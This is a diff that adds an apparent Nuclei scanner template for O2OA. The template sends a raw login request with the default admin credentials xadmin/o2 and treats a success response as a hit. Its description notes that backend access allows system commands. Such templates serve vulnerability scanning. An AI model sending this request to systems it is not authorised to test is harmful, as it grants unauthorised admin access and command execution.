@@ -1,0 +1,37 @@
+http:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '"type": "success"'
+    - distinguishedName
+  matchers-condition: and
+  raw:
+  - 'POST /x_organization_assemble_authentication/jaxrs/authentication/captcha HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: x-token=anonymous
+
+    Authorization: anonymous
+
+    Accept: text/html,application/json,*/*
+
+    Content-Type: application/json; charset=UTF-8
+
+
+    {"credential":"xadmin","password":"o2"}
+
+    '
+id: o2oa-default-login
+info:
+  author: SleepingBag945
+  description: "O2O\u5B58\u5728\u9ED8\u8BA4\u5BC6\u7801xadmin/o2,\u767B\u5F55\u540E\
+    \u53F0\u53EF\u6267\u884C\u7CFB\u7EDF\u547D\u4EE4"
+  name: O2OA Default Login
+  severity: critical
+  tags: o2oa,default-login
